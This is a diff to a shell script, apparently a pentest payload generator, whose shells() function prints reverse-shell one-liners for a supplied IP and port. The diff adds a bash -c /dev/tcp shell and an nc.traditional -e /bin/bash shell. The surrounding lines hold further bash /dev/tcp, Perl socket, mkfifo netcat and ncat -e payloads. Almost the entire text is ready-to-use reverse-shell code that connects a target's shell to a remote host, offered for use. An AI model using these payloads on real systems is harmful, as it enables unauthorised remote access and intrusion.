@@ -103,6 +103,8 @@ shells () {
 		echo -e "[*]\n ${GREEN}bash -i >& /dev/tcp/$1/$2 0>&1${RESET}"
 		echo ""
 		echo -e "[*]\n ${GREEN}0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196${RESET}"
+		echo ""
+		echo -e "[*]\n ${GREEN}bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'${RESET}"
 		;;
 	2 | perl | pl )#Perl Shell
 		echo -e "${GREEN}perl -e 'use Socket;$i=\"$1\";$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'${RESET}"
@@ -124,6 +126,8 @@ shells () {
 		echo -e "[*]\n ${GREEN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f${RESET}"
 		echo ""
 		echo -e "[*]\n ${GREEN}ncat $1 $2 -e /bin/bash${RESET}"
+		echo ""
+		echo -e "[*]\n ${GREEN}nc.traditional -e /bin/bash $1 $2${RESET}"
 		;;
 	7 | java )#Java Shell
 		echo -e "${GREEN}r = Runtime.getRuntime()${RESET}"
